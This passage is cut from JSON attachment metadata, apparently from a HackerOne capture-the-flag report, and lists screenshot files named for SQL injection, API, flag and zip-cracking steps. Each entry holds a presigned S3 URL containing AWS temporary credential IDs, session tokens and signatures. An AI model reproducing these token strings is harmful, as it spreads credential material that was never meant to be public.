I3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8908dad80398d27e0dc44c58972306e3d2243fe5c94e067d90275f4123fee189"},{"id":1139844,"filename":"day11_sqli_inception.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/r0jsrx4bwwbj163zfb5v1w8kclwj?response-content-disposition=attachment%3B%20filename%3D%22day11_sqli_inception.png%22%3B%20filename%2A%3DUTF-8%27%27day11_sqli_inception.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=21d686f7e6ae9d1e66b4839ec84a813174aabfd0600a6322332ff19d35d50347"},{"id":1139845,"filename":"day11_sqli_no_photos.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ii7ykjprpaxoydfurngqqsukdg8m?response-content-disposition=attachment%3B%20filename%3D%22day11_sqli_no_photos.png%22%3B%20filename%2A%3DUTF-8%27%27day11_sqli_no_photos.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=334800d804dc01f68c63a7bb213adcdfc35533f173d5ff8f7ae6241a8ec9f839"},{"id":1139846,"filename":"day11_sqli_processlist.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3t7djibk5oguut6jpngvovoflqmh?response-content-disposition=attachment%3B%20filename%3D%22day11_sqli_processlist.png%22%3B%20filename%2A%3DUTF-8%27%27day11_sqli_processlist.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ef15081bdd95e3a97168bba1e8355b344fa71ce90424a1e7cf34ba2bd41f39dc"},{"id":1139847,"filename":"day11_sqli_union.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/x96uuqda2iw8k3q1ak8ynqxtuifw?response-content-disposition=attachment%3B%20filename%3D%22day11_sqli_union.png%22%3B%20filename%2A%3DUTF-8%27%27day11_sqli_union.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=79e7d46885ad2ac9772a4ba65ae58214a7e1cc75c892857a51b0c9a319dfbe22"},{"id":1139848,"filename":"day11_api_user.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rt1ey91rrquz1kj7wchcqy67lz4j?response-content-disposition=attachment%3B%20filename%3D%22day11_api_user.png%22%3B%20filename%2A%3DUTF-8%27%27day11_api_user.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2d47e260a428ff2c8de56c437337bc3816fa8f827452d8ff40ae53b49c12de3e"},{"id":1139849,"filename":"day11_flag.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/p0ka5u0w0lvj2ye01otvqr7waluo?response-content-disposition=attachment%3B%20filename%3D%22day11_flag.png%22%3B%20filename%2A%3DUTF-8%27%27day11_flag.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1870f4a699ade6fdf4df5a5f1debc3dd7ba7397b0d1e4ba757d4f7f5ac309e4c"},{"id":1139850,"filename":"day11_photo_404.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ryq00wyl0vlf66uwuygdrz6ke5wd?response-content-disposition=attachment%3B%20filename%3D%22day11_photo_404.png%22%3B%20filename%2A%3DUTF-8%27%27day11_photo_404.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=07fc93f48bc7c4036bc40df41ad3a6cc0692578fd027678edc0040110d0ede51"},{"id":1139851,"filename":"day11_photo_api.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tp5rcxt4qx7awh2l6ta5y3su8odo?response-content-disposition=attachment%3B%20filename%3D%22day11_photo_api.png%22%3B%20filename%2A%3DUTF-8%27%27day11_photo_api.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f5bf50f22c6e58c2d3083f31046fe51f162f1605c0bc4356440fe775011b35df"},{"id":1139852,"filename":"day11_photo.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vbnre6906t752mtkqsvx7zrpwzjh?response-content-disposition=attachment%3B%20filename%3D%22day11_photo.png%22%3B%20filename%2A%3DUTF-8%27%27day11_photo.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4dd59e864fd309999f20484c24592285d4290fb4ba01df1d92c3be7ba9605c3b"},{"id":1139873,"filename":"day5_zip_crack.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mv2q59w3xxj7k90rfbrc63vy4hpj?response-content-disposition=attachment%3B%20filename%3D%22day5_zip_crack.png%22%3B%20filename%2A%3DUTF-8%27%27day5_zip_crack.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5